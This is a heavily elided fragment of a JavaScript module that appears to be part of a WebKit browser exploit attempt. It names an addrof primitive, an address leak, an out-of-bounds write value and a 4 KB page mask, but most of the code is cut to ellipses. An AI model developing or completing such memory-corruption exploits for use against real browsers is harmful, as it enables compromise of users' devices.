// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43m - Structure Walk - CORRIGIDO)
...
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { 
    ...
    const current_oob_value = OOB_WRITE_VALUE; 
    ...
    try {
        ...
        const page_mask_4kb = new AdvancedInt64(~0xFFF, 0xFFFFFFFF); 
